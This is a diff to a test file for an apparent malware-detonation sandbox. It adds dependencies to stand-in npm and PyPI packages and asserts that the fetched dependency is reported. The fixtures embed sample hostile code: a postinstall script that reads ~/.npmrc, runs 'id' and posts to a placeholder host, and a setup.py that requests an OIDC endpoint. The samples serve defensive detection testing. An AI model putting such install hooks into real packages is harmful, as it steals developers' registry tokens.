@@ -52,6 +52,9 @@ def test_npm_install_script_that_reads_and_sends_npmrc(tmp_path):
         "const fs = require('fs'), os = require('os'), http = require('http');\n"
         "const https = require('https');\n"
         "const cp = require('child_process');\n"
+        "// A dependency, fetched outside the sandbox: without it the script stops here.\n"
+        "const ms = require('ms');\n"
+        "if (ms('1s') !== 1000) throw new Error('ms');\n"
         "const token = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');\n"
         "cp.execFileSync('id');\n"
         "const req = http.request({hostname: 'collector.invalid', path: '/c', method: 'POST',\n"
@@ -65,10 +68,12 @@ def test_npm_install_script_that_reads_and_sends_npmrc(tmp_path):
     )
     artifact = _tarball(tmp_path / "detonate-standin-1.0.0.tgz", {
         "package/package.json": json.dumps({"name": "detonate-standin", "version": "1.0.0",
+                                            "dependencies": {"ms": "2.1.3"},
                                             "scripts": {"postinstall": "node collect.js"}}),
         "package/collect.js": collect,
     })
     report = _detonate("npm:detonate-standin@1.0.0", artifact, tmp_path / "npm.json")
+    assert any("1 dependency was fetched" in n for n in report["notes"])
     observed = report["observed"]
     assert observed["hook_commands"] == ["node collect.js"]
     assert {r["file"] for r in observed["credentials_read"] if r["package_code"]} == {
@@ -97,10 +102,12 @@ def test_pypi_setup_py_and_import_are_both_observed(tmp_path):
         "    urllib.request.urlopen(oidc, timeout=5)\n"
         "except Exception:\n"
         "    pass\n"
-        "setup(name='detonate-standin', version='1.0', packages=['detonate_standin'])\n"
+        "setup(name='detonate-standin', version='1.0', packages=['detonate_standin'],\n"
+        "      install_requires=['six==1.16.0'])\n"
     )
     module = (
         "import socket\n"
+        "import six  # a dependency, fetched outside the sandbox\n"
         "try:\n"
         "    socket.gethostbyname('imported.invalid')\n"
         "except OSError:\n"
@@ -113,6 +120,7 @@ def test_pypi_setup_py_and_import_are_both_observed(tmp_path):
         "detonate-standin-1.0/detonate_standin/__init__.py": module,
     })
     report = _detonate("pypi:detonate-standin@1.0", artifact, tmp_path / "pypi.json")
+    assert any("1 dependency was fetched" in n for n in report["notes"])
     observed = report["observed"]
     hooks = observed["hook_commands"]
     assert any(h.startswith("setup.py") for h in hooks)  # pip runs it, once per step
